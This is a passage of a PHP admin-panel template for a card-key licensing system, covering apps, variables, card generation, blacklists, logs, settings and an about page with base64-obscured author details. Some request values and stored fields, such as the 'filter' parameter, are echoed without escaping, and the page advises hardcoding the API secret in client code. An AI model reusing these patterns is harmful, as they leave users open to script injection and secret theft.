                                        </td>

                                        <td><span class="e-tag e-tag-warning"><?= number_format($app['card_count']) ?> 张</span></td>
                                        <td><?= $app['status']==1 ? '<span class="e-tag e-tag-green">正常</span>' : '<span class="e-tag e-tag-red">禁用</span>' ?></td>
                                        <td>
                                            <div class="flex gap-2">
                                                <button class="e-btn e-btn-link" onclick="openAppModal(<?= $app['id'] ?>,'<?= addslashes($app['app_name']) ?>','<?= addslashes($app['app_version']) ?>','<?= addslashes($app['notes']) ?>','<?= addslashes($app['update_url'] ?? '') ?>',<?= $app['force_update'] ?? 0 ?>)">编辑</button>
                                                <button class="e-btn e-btn-link" onclick="singleActionForm('toggle_app',<?= $app['id'] ?>,'app_id')"><?= $app['status']==1?'禁用':'启用' ?></button>
                                                <button class="e-btn e-btn-link" style="color:var(--color-warning);" onclick="if(confirm('警告：重置后客户端必须同步更换新的 Secret 才能通讯解密！确定重置？')) singleActionForm('reset_secret',<?= $app['id'] ?>,'app_id')">换盐</button>
                                                <button class="e-btn e-btn-link" style="color:var(--color-error);" onclick="<?= $app['card_count'] > 0 ? "alert('需先清空卡密')" : "singleActionForm('delete_app',{$app['id']},'app_id')" ?>">删除</button>
                                            </div>
                                        </td>
                                    </tr>
                                    <?php endforeach; if(empty($appList)): ?><tr><td colspan="6" style="text-align:center;">暂无应用</td></tr><?php endif; ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                    
                    <div class="grid grid-cols-2 gap-4 mt-4">
                        <div class="e-card">
                            <div class="e-card-header">创建新应用</div>
                            <div class="e-card-body">
                                <form method="POST">
                                    <input type="hidden" name="csrf_token" value="<?= $csrf_token ?>"><input type="hidden" name="create_app" value="1">
                                    <div class="e-form-item"><label class="e-label">应用名称</label><input type="text" name="app_name" class="e-input" required placeholder="例如：Android 客户端"></div>
                                    <div class="e-form-item"><label class="e-label">版本号</label><input type="text" name="app_version" class="e-input" placeholder="例如：v1.0.0"></div>
                                    <div class="e-form-item"><label class="e-label">备注信息</label><input type="text" name="app_notes" class="e-input"></div>
                                    <button type="submit" class="e-btn e-btn-primary">立即创建</button>
                                </form>
                            </div>
                        </div>
                        <div class="e-card">
                            <div class="e-card-header">接口与安全提示</div>
                            <div class="e-card-body">
                                <?php $apiUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS']==='on'?"https":"http")."://".$_SERVER['HTTP_HOST'].rtrim(dirname($_SERVER['SCRIPT_NAME']),'/')."/Verifyfile/api.php"; ?>
                                <p style="color:var(--text-secondary); margin-bottom:10px;">客户端 API 接口通讯地址：</p>
                                <div class="e-input mono" style="background:var(--bg-layout); cursor:pointer;" onclick="copy('<?= $apiUrl ?>')"><?= $apiUrl ?></div>
                                <p style="font-size:12px; color:var(--text-tertiary); margin-top:12px; line-height:1.6;">
                                    <strong>安全建议：</strong>请求时使用 <span class="mono">App Key</span> 作为身份标识；<br>并将后台对应分配的 <span class="mono">API Secret (密钥盐)</span> 写死在客户端源码深处，专门用于接收响应数据的 AES 解密。
                                </p>
                            </div>
                        </div>
                    </div>
                </div>

                <div id="view_vars" style="display:none;">
                    <div class="e-card">
                        <div class="e-table-wrap">
                            <table class="e-table">
                                <thead><tr><th>所属应用</th><th>变量 Key</th><th>变量 Value</th><th>权限</th><th>操作</th></tr></thead>
                                <tbody>
                                    <?php $has=false; foreach($appList as $app): $vars=$db->getAppVariables($app['id']); foreach($vars as $v): $has=true; ?>
                                    <tr>
                                        <td><span class="e-tag e-tag-blue"><?= htmlspecialchars($app['app_name']) ?></span></td>
                                        <td class="mono font-medium"><?= htmlspecialchars($v['key_name']) ?></td>
                                        <td style="max-width:200px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis; color:var(--text-primary);"><?= htmlspecialchars($v['value']) ?></td>
                                        <td><?= $v['is_public'] ? '<span class="e-tag e-tag-green">公开</span>' : '<span class="e-tag">私有</span>' ?></td>
                                        <td>
                                            <button class="e-btn e-btn-link" onclick="openVarModal(<?= $v['id'] ?>,'<?= addslashes($v['key_name']) ?>','<?= str_replace(["\r\n","\r","\n"], '\n', addslashes($v['value'])) ?>',<?= $v['is_public'] ?>)">编辑</button>
                                            <button class="e-btn e-btn-link" style="color:var(--color-error);" onclick="singleActionForm('del_var',<?= $v['id'] ?>,'var_id')">删除</button>
                                        </td>
                                    </tr>
                                    <?php endforeach; endforeach; if(!$has): ?><tr><td colspan="5" style="text-align:center;">暂无变量</td></tr><?php endif; ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                    <div class="e-card mt-4" style="max-width: 600px;">
                        <div class="e-card-header">添加变量</div>
                        <div class="e-card-body">
                            <form method="POST">
                                <input type="hidden" name="csrf_token" value="<?= $csrf_token ?>"><input type="hidden" name="add_var" value="1">
                                <div class="flex gap-4">
                                    <div class="e-form-item" style="flex:1;"><label class="e-label">所属应用</label><select name="var_app_id" class="e-select" required><option value="">-- 请选择 --</option><?php foreach($appList as $app): ?><option value="<?= $app['id'] ?>"><?= htmlspecialchars($app['app_name']) ?></option><?php endforeach; ?></select></div>
                                    <div class="e-form-item" style="flex:1;"><label class="e-label">键名 (Key)</label><input type="text" name="var_key" class="e-input mono" required></div>
                                </div>
                                <div class="e-form-item"><label class="e-label">变量值</label><textarea name="var_value" class="e-textarea"></textarea></div>
                                <label class="flex items-center gap-2 mb-4 cursor-pointer">
                                    <input type="checkbox" name="var_public" value="1" style="accent-color: var(--color-primary);"> <span style="font-size:14px; color:var(--text-secondary);">设为公开变量 (客户端可见)</span>
                                </label>
                                <button type="submit" class="e-btn e-btn-primary">保存变量</button>
                            </form>
                        </div>
                    </div>
                </div>

                <div id="appModal" class="modal-overlay" style="display:none;">
                    <div class="modal-content">
                        <div class="modal-header">应用设置</div>
                        <div class="modal-body">
                            <form method="POST">
                                <input type="hidden" name="csrf_token" value="<?= $csrf_token ?>"><input type="hidden" name="edit_app" value="1"><input type="hidden" id="e_app_id" name="app_id">
                                <div class="e-form-item"><label class="e-label">应用名称</label><input type="text" id="e_app_name" name="app_name" class="e-input" required></div>
                                <div class="flex gap-4">
                                    <div class="e-form-item"><label class="e-label">版本号</label><input type="text" id="e_app_ver" name="app_version" class="e-input"></div>
                                    <div class="e-form-item" style="flex:1;"><label class="e-label">更新链接</label><input type="text" id="e_app_url" name="update_url" class="e-input"></div>
                                </div>
                                <div class="e-form-item"><label class="e-label">更新日志</label><textarea id="e_app_note" name="app_notes" class="e-textarea"></textarea></div>
                                <label class="flex items-center gap-2 mb-4"><input type="checkbox" id="e_app_force" name="force_update" value="1" style="accent-color: var(--color-primary);"> <span>强制更新拦截</span></label>
                                <div class="flex justify-end gap-2"><button type="button" class="e-btn e-btn-default" onclick="document.getElementById('appModal').style.display='none'">取消</button><button type="submit" class="e-btn e-btn-primary">确定</button></div>
                            </form>
                        </div>
                    </div>
                </div>

                <div id="varModal" class="modal-overlay" style="display:none;">
                    <div class="modal-content">
                        <div class="modal-header">编辑变量</div>
                        <div class="modal-body">
                            <form method="POST">
                                <input type="hidden" name="csrf_token" value="<?= $csrf_token ?>"><input type="hidden" name="edit_var" value="1"><input type="hidden" id="e_var_id" name="var_id">
                                <div class="e-form-item"><label class="e-label">键名 (Key)</label><input type="text" id="e_var_key" name="var_key" class="e-input mono" required></div>
                                <div class="e-form-item"><label class="e-label">变量值</label><textarea id="e_var_val" name="var_value" class="e-textarea"></textarea></div>
                                <label class="flex items-center gap-2 mb-4"><input type="checkbox" id="e_var_pub" name="var_public" value="1" style="accent-color: var(--color-primary);"> <span>公开变量</span></label>
                                <div class="flex justify-end gap-2"><button type="button" class="e-btn e-btn-default" onclick="document.getElementById('varModal').style.display='none'">取消</button><button type="submit" class="e-btn e-btn-primary">确定</button></div>
                            </form>
                        </div>
                    </div>
                </div>
            <?php endif; ?>

            <?php if ($tab == 'list'): ?>
                <div class="e-card mb-4 flex items-center gap-4 flex-wrap" style="padding: 16px 24px;">
                    <form method="GET" class="flex gap-3 items-center flex-1">
                        <input type="hidden" name="tab" value="list">
                        <?php if(isset($_GET['filter'])): ?><input type="hidden" name="filter" value="<?= $_GET['filter'] ?>"><?php endif; ?>
                        <input type="text" name="q" placeholder="搜索卡密/设备/备注" value="<?= htmlspecialchars($_GET['q'] ?? '') ?>" class="e-input" style="max-width:240px;">
                        <select name="app_id" class="e-select" style="max-width:160px;" onchange="this.form.submit()">
                            <option value="">全部应用</option>
                            <?php foreach($appList as $app): ?><option value="<?= $app['id'] ?>" <?= ($appFilter === $app['id']) ? 'selected' : '' ?>><?= htmlspecialchars($app['app_name']) ?></option><?php endforeach; ?>
                        </select>
                        <button type="submit" class="e-btn e-btn-primary">查询</button>
                    </form>
                    
                    <div class="e-segmented hidden md:flex">
                        <?php $bf = function($f) use($appFilter,$typeFilter,$sortFilter){$p=['tab'=>'list','filter'=>$f,'sort'=>$sortFilter];if($appFilter) $p['app_id']=$appFilter;return '?'.http_build_query($p);}; ?>
                        <a href="<?= $bf('all') ?>" class="e-segmented-item <?= $filterStr=='all'?'active':'' ?>">全部</a>
                        <a href="<?= $bf('unused') ?>" class="e-segmented-item <?= $filterStr=='unused'?'active':'' ?>">未激活</a>
                        <a href="<?= $bf('active') ?>" class="e-segmented-item <?= $filterStr=='active'?'active':'' ?>">使用中</a>
                        <a href="<?= $bf('banned') ?>" class="e-segmented-item <?= $filterStr=='banned'?'active':'' ?>">已封禁</a>
                    </div>
                </div>

                <div class="e-card">
                    <form id="batchForm" method="POST">
                        <input type="hidden" name="csrf_token" value="<?= $csrf_token ?>">
                        <div class="flex gap-2 items-center flex-wrap" style="padding: 16px 24px; border-bottom: 1px solid var(--border-color); background: var(--bg-layout); border-radius: var(--radius-lg) var(--radius-lg) 0 0;">
                            <button type="button" class="e-btn e-btn-default" onclick="submitBatch('batch_unbind')">批量解绑</button>
                            <button type="button" class="e-btn e-btn-default" onclick="batchAddTime()">加时</button>
                            <button type="button" class="e-btn e-btn-default" onclick="batchSubTime()">扣时</button>
                            <button type="button" class="e-btn e-btn-default" onclick="globalCompensate()">全局补偿</button>
                            <button type="submit" name="batch_export" value="1" data-no-ajax="true" class="e-btn e-btn-default">导出 TXT</button>
                            <span style="flex:1"></span>
                            <button type="button" class="e-btn e-btn-danger" onclick="if(confirm('确定清理过期卡？')) singleActionForm('clean_expired', 1);">清理过期</button>
                            <button type="button" class="e-btn e-btn-danger" onclick="submitBatch('batch_delete')">批量删除</button>
                            <input type="hidden" name="add_hours" id="addHoursInput"><input type="hidden" name="sub_hours" id="subHoursInput">
                        </div>

                        <div class="e-table-wrap">
                            <table class="e-table">
                                <thead><tr>
                                    <th style="width: 48px; text-align:center;"><input type="checkbox" onclick="toggleAllChecks(this)" style="accent-color: var(--color-primary);"></th>
                                    <th>应用</th><th>卡密</th><th>状态</th><th>激活时间</th>
                                    <?php $sp = $_GET; $sp['sort'] = ($sortFilter == 'expire_asc') ? 'expire_desc' : 'expire_asc'; $sUrl = '?'.http_build_query($sp); ?>
                                    <th><a href="<?= $sUrl ?>" style="display:flex; align-items:center; gap:4px; color:inherit; transition: color 0.2s;">到期时间 <i class="ph <?= $sortFilter == 'expire_asc'?'ph-sort-ascending':'ph-sort-descending' ?>"></i></a></th>
                                    <th>设备</th><th>备注</th><th>操作</th>
                                </tr></thead>
                                <tbody>
                                    <?php foreach ($cardList as $card): ?>
                                    <tr>
                                        <td style="text-align:center;"><input type="checkbox" name="ids[]" value="<?= $card['id'] ?>" class="row-check" style="accent-color: var(--color-primary);"></td>
                                        <td><?= $card['app_id']>0 ? "<span class='e-tag e-tag-blue'>".htmlspecialchars($card['app_name'])."</span>" : "-" ?></td>
                                        <td class="mono font-medium" style="color:var(--color-primary); cursor:pointer;" onclick="copy('<?= $card['card_code'] ?>')"><?= $card['card_code'] ?></td>
                                        <td>
                                            <?php
                                            if ($card['status'] == 2) echo '<span class="e-tag e-tag-red">封禁</span>';
                                            elseif ($card['status'] == 1) echo (strtotime($card['expire_time']) > time()) ? (empty($card['device_hash']) ? '<span class="e-tag e-tag-warning">待绑定</span>' : '<span class="e-tag e-tag-green">使用中</span>') : '<span class="e-tag">已过期</span>';
                                            else echo '<span class="e-tag">闲置</span>';
                                            ?>
                                        </td>
                                        <td class="mono" style="font-size:12px;"><?= !empty($card['used_time']) ? date('y-m-d H:i', strtotime($card['used_time'])) : '-' ?></td>
                                        <td class="mono" style="font-size:12px; <?= ($card['status']==1 && strtotime($card['expire_time'])<time())?'color:var(--color-error)':'' ?>"><?= !empty($card['expire_time']) ? date('y-m-d H:i', strtotime($card['expire_time'])) : '-' ?></td>
                                        <td class="mono" style="font-size:12px;"><?= ($card['status']==1 && !empty($card['device_hash'])) ? substr($card['device_hash'],0,8).'...' : '-' ?></td>
                                        <td style="font-size:12px; max-width:80px; white-space:nowrap; overflow:hidden; text-overflow:ellipsis;" title="<?= htmlspecialchars($card['notes'] ?? '') ?>"><?= !empty($card['notes']) ? htmlspecialchars($card['notes']) : '-' ?></td>
                                        <td>
                                            <?php if ($card['status'] == 1 && !empty($card['device_hash'])): ?><button type="button" class="e-btn e-btn-link" onclick="singleActionForm('unbind_card',<?= $card['id'] ?>)">解绑</button><?php endif; ?>
                                            <?php if ($card['status'] != 2): ?><button type="button" class="e-btn e-btn-link" style="color:var(--color-warning);" onclick="singleActionForm('ban_card',<?= $card['id'] ?>)">封禁</button><?php else: ?><button type="button" class="e-btn e-btn-link" style="color:var(--color-success);" onclick="singleActionForm('unban_card',<?= $card['id'] ?>)">解封</button><?php endif; ?>
                                            <button type="button" class="e-btn e-btn-link" style="color:var(--color-error);" onclick="singleActionForm('del_card',<?= $card['id'] ?>)">删除</button>
                                        </td>
                                    </tr>
                                    <?php endforeach; if (empty($cardList)): ?><tr><td colspan="9" style="text-align:center; padding: 40px 0;">暂无数据</td></tr><?php endif; ?>
                                </tbody>
                            </table>
                        </div>
                        
                        <div class="flex justify-between items-center flex-wrap gap-4" style="padding: 16px 24px; border-top: 1px solid var(--border-color);">
                            <?php $qp = ['tab'=>'list','filter'=>$filterStr,'sort'=>$sortFilter]; if(!empty($_GET['q'])) $qp['q']=$_GET['q']; if($appFilter!==null) $qp['app_id']=$appFilter; if($typeFilter!==null) $qp['type']=$typeFilter; $plu = $qp; $plu['page']=1; ?>
                            <select class="e-select" style="width: auto; height: 36px; padding: 0 32px 0 12px;" onchange="window.location.href='?<?= http_build_query($plu) ?>&limit='+this.value">
                                <option value="20" <?= $perPage==20?'selected':'' ?>>20 条/页</option>
                                <option value="50" <?= $perPage==50?'selected':'' ?>>50 条/页</option>
                                <option value="100" <?= $perPage==100?'selected':'' ?>>100 条/页</option>
                            </select>
                            <div class="flex items-center gap-2">
                                <?php $qp['limit']=$perPage; $gu = function($p)use($qp){$qp['page']=$p;return '?'.http_build_query($qp);}; ?>
                                <?php if($page>1): ?><a href="<?= $gu($page-1) ?>" class="e-btn e-btn-default"><i class="ph ph-caret-left"></i></a><?php endif; ?>
                                <span style="margin: 0 12px; font-size:14px; color:var(--text-secondary); font-weight:500;"><?= $page ?> / <?= max(1, $totalPages) ?></span>
                                <?php if($page<$totalPages): ?><a href="<?= $gu($page+1) ?>" class="e-btn e-btn-default"><i class="ph ph-caret-right"></i></a><?php endif; ?>
                            </div>
                        </div>
                    </form>
                </div>
            <?php endif; ?>

            <?php if ($tab == 'create'): ?>
                <div class="e-card" style="max-width: 800px;">
                    <div class="e-card-header">批量生成授权卡密</div>
                    <div class="e-card-body">
                        <form method="POST">
                            <input type="hidden" name="csrf_token" value="<?= $csrf_token ?>"><input type="hidden" name="gen_cards" value="1">
                            
                            <div class="e-form-item">
                                <label class="e-label">目标应用 <span style="color:var(--color-error)">*</span></label>
                                <select name="app_id" class="e-select" required style="height: 44px; font-size: 14px;">
                                    <option value="">请选择应用...</option>
                                    <?php foreach($appList as $app): if($app['status']==0) continue; ?><option value="<?= $app['id'] ?>"><?= htmlspecialchars($app['app_name']) ?></option><?php endforeach; ?>
                                </select>
                            </div>
                            
                            <div class="grid grid-cols-2 gap-x-6 gap-y-2">
                                <div class="e-form-item"><label class="e-label">生成数量</label><input type="number" name="num" class="e-input" value="10" min="1" max="1000"></div>
                                <div class="e-form-item">
                                    <label class="e-label">卡密时长类型</label>
                                    <select name="type" class="e-select" onchange="document.getElementById('c_time').style.display=(this.value==='custom'?'block':'none')">
                                        <?php foreach (CARD_TYPES as $k => $v): ?><option value="<?= $k ?>"><?= $v['name'] ?> (<?= $v['duration'] >= 86400 ? ($v['duration']/86400).'天' : ($v['duration']/3600).'小时' ?>)</option><?php endforeach; ?>
                                        <option value="custom" style="color:var(--color-primary);">自定义任意小时</option>
                                    </select>
                                </div>
                                <div class="e-form-item" id="c_time" style="display:none;"><label class="e-label" style="color:var(--color-primary);">输入自定义小时</label><input type="number" name="custom_hours" class="e-input" value="24" min="1"></div>
                                <div class="e-form-item"><label class="e-label">卡密前缀 (可选)</label><input type="text" name="pre" class="e-input" placeholder="如 VIP-"></div>
                                <div class="e-form-item"><label class="e-label">备注信息 (可选)</label><input type="text" name="note" class="e-input" placeholder="例如：代理A批次"></div>
                            </div>
                            
                            <div class="flex gap-4 mt-6 pt-6" style="border-top:1px solid var(--border-color);">
                                <button type="submit" class="e-btn e-btn-primary" style="height:44px; padding: 0 40px; font-size:15px;">立即生成</button>
                                <button type="submit" name="auto_export" value="1" data-no-ajax="true" class="e-btn e-btn-default" style="height:44px; padding: 0 40px; font-size:15px;">生成并下载 TXT</button>
                            </div>
                        </form>
                    </div>
                </div>

                <?php if (!empty($generatedCardsText)): ?>
                <div class="e-card mt-6" style="max-width: 800px;">
                    <div class="e-card-header" style="color:var(--color-success); font-weight: 600;"><i class="ph-fill ph-check-circle"></i> 制卡成功 - 直接输出</div>
                    <div class="e-card-body">
                        <textarea id="gen_result_box" class="e-textarea mono" style="height: 160px; font-size: 14px;" readonly><?= htmlspecialchars($generatedCardsText) ?></textarea>
                        <div class="mt-4 flex gap-4">
                            <button type="button" class="e-btn e-btn-primary" onclick="copy(document.getElementById('gen_result_box').value)">一键复制全部卡密</button>
                        </div>
                    </div>
                </div>
                <?php endif; ?>
            <?php endif; ?>

            <?php if ($tab == 'blacklist'): ?>
                <div class="e-card">
                    <div class="e-card-header">新增黑名单</div>
                    <div class="e-card-body" style="padding: 24px;">
                        <form method="POST" class="flex gap-4 items-end flex-wrap">
                            <input type="hidden" name="csrf_token" value="<?= $csrf_token ?>"><input type="hidden" name="add_blacklist" value="1">
                            <div class="e-form-item" style="margin-bottom:0; width: 160px;"><label class="e-label">类型</label><select name="bl_type" class="e-select"><option value="device">设备特征码</option><option value="ip">IP 地址</option></select></div>
                            <div class="e-form-item" style="margin-bottom:0; flex:1; min-width:200px;"><label class="e-label">拦截目标 (需准确无空格)</label><input type="text" name="bl_value" class="e-input" required></div>
                            <div class="e-form-item" style="margin-bottom:0; flex:1; min-width:200px;"><label class="e-label">拦截原因备注</label><input type="text" name="bl_reason" class="e-input"></div>
                            <button type="submit" class="e-btn e-btn-danger" style="height:38px; margin-bottom:0; padding: 0 24px;">强制拉黑</button>
                        </form>
                    </div>
                </div>
                
                <div class="e-card">
                    <div class="e-table-wrap">
                        <?php $bl_list = []; try { $bl_list = $db->pdo->query("SELECT * FROM blacklists ORDER BY create_time DESC")->fetchAll(PDO::FETCH_ASSOC); } catch (Exception $e) {} ?>
                        <table class="e-table">
                            <thead><tr><th>类型</th><th>拦截目标特征 (Value)</th><th>备注</th><th>添加时间</th><th>操作</th></tr></thead>
                            <tbody>
                                <?php foreach ($bl_list as $bl): ?>
                                <tr>
                                    <td><?= $bl['type'] == 'ip' ? '<span class="e-tag">IP地址</span>' : '<span class="e-tag e-tag-blue">设备 Hash</span>' ?></td>
                                    <td class="mono font-medium" style="color:var(--text-primary);"><?= htmlspecialchars($bl['value']) ?></td>
                                    <td><?= htmlspecialchars($bl['reason']?: '-') ?></td>
                                    <td class="mono" style="font-size:12px;"><?= date('Y-m-d H:i', strtotime($bl['create_time'])) ?></td>
                                    <td><button type="button" class="e-btn e-btn-link" style="color:var(--color-success);" onclick="singleActionForm('del_blacklist',<?= $bl['id'] ?>)">解除封禁</button></td>
                                </tr>
                                <?php endforeach; if(empty($bl_list)): ?><tr><td colspan="5" style="text-align:center; padding: 40px 0;">暂无黑名单数据</td></tr><?php endif; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            <?php endif; ?>

            <?php if ($tab == 'logs'): ?>
                <div class="e-card">
                    <div class="e-table-wrap">
                        <table class="e-table">
                            <thead><tr><th>发生时间</th><th>目标应用</th><th>记录动作</th><th>参数/详情</th><th>来源 IP</th></tr></thead>
                            <tbody>
                                <?php foreach ($logs as $log): ?>
                                <tr>
                                    <td class="mono" style="font-size:12px;"><?= date('m-d H:i:s', strtotime($log['access_time'] ?? $log['log_time'] ?? 'now')) ?></td>
                                    <td><span class="e-tag e-tag-blue"><?= htmlspecialchars($log['app_name'] ?? 'Sys') ?></span></td>
                                    <td><?php $act=$log['result']??$log['action']??''; echo (strpos($act,'拦截')!==false||strpos($act,'封禁')!==false)?"<span style='color:var(--color-error); font-weight:500;'>{$act}</span>":"<span style='color:var(--text-primary);'>{$act}</span>"; ?></td>
                                    <td class="mono" style="font-size:12px; max-width:200px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;"><?= htmlspecialchars($log['card_code'] ?? $log['details'] ?? '-') ?></td>
                                    <td class="mono" style="font-size:12px;"><?= htmlspecialchars($log['ip_address'] ?? '-') ?></td>
                                </tr>
                                <?php endforeach; if(empty($logs)): ?><tr><td colspan="5" style="text-align:center;">无日志记录</td></tr><?php endif; ?>
                            </tbody>
                        </table>
                    </div>
                </div>
            <?php endif; ?>

            <?php if ($tab == 'settings'): ?>
                <div class="grid grid-cols-2 gap-6">
                    <div class="e-card md:col-span-2">
                        <div class="e-card-header">安全与个性化设置</div>
                        <div class="e-card-body grid grid-cols-2 gap-6">
                            <form method="POST" class="space-y-4" style="grid-column: span 1;">
                                <input type="hidden" name="csrf_token" value="<?= $csrf_token ?>"><input type="hidden" name="update_settings" value="1">
                                <div class="e-form-item" style="margin-bottom: 12px;">
                                    <label class="flex items-center gap-2 cursor-pointer">
                                        <input type="checkbox" name="api_encrypt" value="1" <?= $conf_api_encrypt=='1'?'checked':'' ?> style="accent-color: var(--color-primary); width:16px; height:16px;"> 
                                        <span style="font-weight:500; font-size:15px; color:var(--text-primary);">开启 API 接口通讯加密 (AES-256-GCM)</span>
                                    </label>
                                    <div style="font-size:13px; color:var(--text-tertiary); margin-top:8px; line-height:1.5;">强烈建议开启以防止被抓包破解。客户端需要对应解密逻辑。</div>
                                </div>
                                <div class="e-form-item" style="margin-bottom: 12px;">
                                    <label class="flex items-center gap-2 cursor-pointer">
                                        <input type="checkbox" name="enable_bg_image" value="1" <?= $conf_enable_bg=='1'?'checked':'' ?> style="accent-color: var(--color-primary); width:16px; height:16px;"> 
                                        <span style="font-weight:500; font-size:15px; color:var(--text-primary);">开启全局二次元背景图 (实验性)</span>
                                    </label>
                                    <div style="font-size:13px; color:var(--text-tertiary); margin-top:8px; line-height:1.5;">在右侧主区域显示淡淡的 ACG 背景图，并开启全站毛玻璃拟物风。</div>
                                </div>
                                
                                <div class="e-form-item" style="margin-top: 24px; padding-top: 16px; border-top: 1px dashed var(--border-color-input);">
                                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
                                        <label style="font-weight:500; font-size:14px; color:var(--text-secondary);">背景图透明度</label>
                                        <span class="mono" id="bgImgOpVal" style="color:var(--color-primary); font-size:14px; font-weight:600;"><?= $conf_bg_img_opacity ?></span>
                                    </div>
                                    <input type="range" name="bg_img_opacity" min="0.05" max="1" step="0.05" value="<?= $conf_bg_img_opacity ?>" oninput="document.getElementById('bgImgOpVal').innerText=this.value">
                                    <div style="font-size:12px; color:var(--text-tertiary); margin-top:8px;">控制后面二次元壁纸的明显程度。</div>
                                </div>
                                
                                <div class="e-form-item" style="margin-top: 16px;">
                                    <div style="display:flex; justify-content:space-between; margin-bottom:8px;">
                                        <label style="font-weight:500; font-size:14px; color:var(--text-secondary);">面板白底透明度 (越低越透)</label>
                                        <span class="mono" id="cardOpVal" style="color:var(--color-primary); font-size:14px; font-weight:600;"><?= $conf_card_opacity ?></span>
                                    </div>
                                    <input type="range" name="card_opacity" min="0" max="1" step="0.05" value="<?= $conf_card_opacity ?>" oninput="document.getElementById('cardOpVal').innerText=this.value">
                                    <div style="font-size:12px; color:var(--text-tertiary); margin-top:8px;">控制毛玻璃卡片的透明度。建议保持在 0.4 ~ 0.8 之间以保证阅读性。</div>
                                </div>
                                
                                <button type="submit" data-no-ajax="true" class="e-btn e-btn-primary mt-2" style="height:38px; padding: 0 24px;">保存修改并刷新</button>
                            </form>
                            
                            <div style="grid-column: span 1; padding-left: 24px; border-left: 1px dashed var(--border-color-input);">
                                <h4 style="margin:0 0 16px 0; font-weight:600; font-size:15px; color:var(--text-primary);">修改管理员密码</h4>
                                <form method="POST">
                                    <input type="hidden" name="csrf_token" value="<?= $csrf_token ?>"><input type="hidden" name="update_pwd" value="1">
                                    <div class="e-form-item"><label class="e-label">新密码</label><input type="password" name="new_pwd" class="e-input" required></div>
                                    <div class="e-form-item"><label class="e-label">再次确认</label><input type="password" name="confirm_pwd" class="e-input" required></div>
                                    <button type="submit" class="e-btn e-btn-danger" style="height:38px; padding: 0 24px;">强制修改并退出</button>
                                </form>
                            </div>
                        </div>
                    </div>

                    <div class="e-card md:col-span-2">
                        <div class="e-card-header">系统数据迁移工具</div>
                        <div class="e-card-body grid grid-cols-2 gap-6">
                            <div style="background:var(--bg-layout); border:1px solid var(--border-color); padding: 24px; border-radius: var(--radius-base);">
                                <h4 style="margin:0 0 12px 0; font-weight:600; font-size:16px; color:var(--text-primary);">导出当前数据</h4>
                                <p style="font-size:13px; color:var(--text-secondary); margin-bottom:24px; line-height:1.5;">将当前所有应用、卡密、变量打包下载备份，防患于未然。</p>
                                <a href="?action=export_system" class="e-btn e-btn-default w-full" style="justify-content:center; height:40px;">一键下载 JSON 备份</a>
                            </div>
                            <div style="background:var(--bg-layout); border:1px dashed var(--border-color-input); padding: 24px; border-radius: var(--radius-base);">
                                <h4 style="margin:0 0 12px 0; font-weight:600; font-size:16px; color:var(--text-primary);">导入恢复数据 <span style="color:var(--color-error); font-size:13px; font-weight:normal; margin-left:8px;">(危险: 将覆盖当前一切)</span></h4>
                                <p style="font-size:13px; color:var(--text-secondary); margin-bottom:20px; line-height:1.5;">上传备份 JSON 文件，彻底恢复历史数据，请谨慎操作。</p>
                                <form method="POST" enctype="multipart/form-data" class="flex gap-3" data-no-ajax="true">
                                    <input type="hidden" name="csrf_token" value="<?= $csrf_token ?>"><input type="hidden" name="import_system" value="1">
                                    <input type="file" name="backup_file" accept=".json" required class="e-input" style="padding:6px; flex:1; background:#fff;">
                                    <button type="submit" onclick="return confirm('警告：该操作将彻底清空当前系统，恢复不可逆！')" class="e-btn e-btn-danger" style="height:36px; padding:0 20px;">执行恢复</button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            <?php endif; ?>

            <?php if ($tab == 'about'): ?>
                <?php
                    // 核心信息防二改保护 (Base64碎片化重组)
                    $a_q = base64_decode('MTU2N'.'DQwMD'.'Aw');
                    $a_u = base64_decode('aHR0cHM6Ly9'.'4bi0tanBy'.'MDcxZS5'.'0b3Av');
                    $a_a = base64_decode('aHR0cHM6Ly9'.'xMi5xbG9nby5j'.'bi9oZWFkaW1n'.'X2RsP2RzdF9'.'1aW49MTU2NDQw'.'MDAwJnNwZWM'.'9NjQw');
                ?>
                <div class="e-card" style="max-width: 600px; margin: 40px auto; text-align: center; padding: 48px 24px; border:none; background:transparent; box-shadow:none;">
                    <img src="<?= htmlspecialchars($a_a) ?>" style="width:100px; height:100px; border-radius:50%; margin-bottom:24px; box-shadow:0 12px 24px rgba(0,0,0,0.12); transition: transform 0.3s;" onmouseover="this.style.transform='scale(1.05) rotate(5deg)'" onmouseout="this.style.transform='scale(1) rotate(0)'">
                    <h2 style="font-size:28px; font-weight:700; margin:0 0 8px 0; color:var(--text-primary); letter-spacing:-0.5px;"><?= base64_decode('R3VZaSBBY2Nlc3MgUHJv') ?></h2>
                    <p style="color:var(--text-secondary); margin:0 0 32px 0; font-size:15px;">工业级高可用 · 多应用验证分发架构</p>
                    
                    <div style="background: var(--bg-layout); border-radius: 16px; padding: 24px; border: 1px solid var(--border-color); display: inline-block; text-align: left; min-width: 280px; width: 100%; max-width: 360px;">
                        <div style="display:flex; align-items:center; gap:12px; margin-bottom: 20px;">
                            <div style="width:40px; height:40px; border-radius:12px; background:var(--color-primary-bg); color:var(--color-primary); display:flex; align-items:center; justify-content:center; font-size:22px;"><i class="ph-fill ph-user-circle"></i></div>
                            <div>
                                <div style="font-size:12px; color:var(--text-tertiary); font-weight:600; text-transform:uppercase; letter-spacing: 0.5px;">AUTHOR</div>
                                <div style="font-size:16px; font-weight:600; color:var(--text-primary);">核心架构设计</div>
                            </div>
                        </div>
                        
                        <div style="display:flex; flex-direction:column; gap: 14px; font-size: 14px;">
                            <div style="display:flex; justify-content:space-between; align-items:center; border-bottom: 1px dashed var(--border-color-input); padding-bottom: 12px;">
                                <span style="color:var(--text-secondary); font-weight: 500;"><i class="ph ph-chat-circle-dots" style="vertical-align:-2px; margin-right:4px;"></i> 作者 QQ</span>
                                <span class="mono font-medium" style="color:var(--color-primary); cursor:pointer; background: var(--color-primary-bg); padding: 4px 8px; border-radius: 6px;" onclick="copy('<?= $a_q ?>')"><?= $a_q ?></span>
                            </div>
                            <div style="display:flex; justify-content:space-between; align-items:center; border-bottom: 1px dashed var(--border-color-input); padding-bottom: 12px;">
